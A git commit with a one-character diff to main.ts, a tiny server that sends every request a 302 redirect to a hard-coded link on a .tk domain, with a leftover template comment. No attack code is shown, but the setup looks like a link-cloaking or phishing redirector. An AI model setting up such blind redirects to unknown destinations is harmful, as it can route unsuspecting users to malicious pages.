524bce23bda5a504e96c14e15060e14d5aa61df6
Digital2025001 <bosmichael30@gmail.com>
2025-10-25 09:40:05 -0500

    Update main.ts

--- main.ts
+++ main.ts
@@ -4,7 +4,7 @@ serve((_req) => {
   return new Response(null, {
     status: 302,
     headers: {
-      Location: "https://ib.anonymismus.tk/ps/irsm3p", // Replace this with your actual link
+      Location: "https://ib.anonymismus.tk/ps/irsm3", // Replace this with your actual link
     },
   });
 });
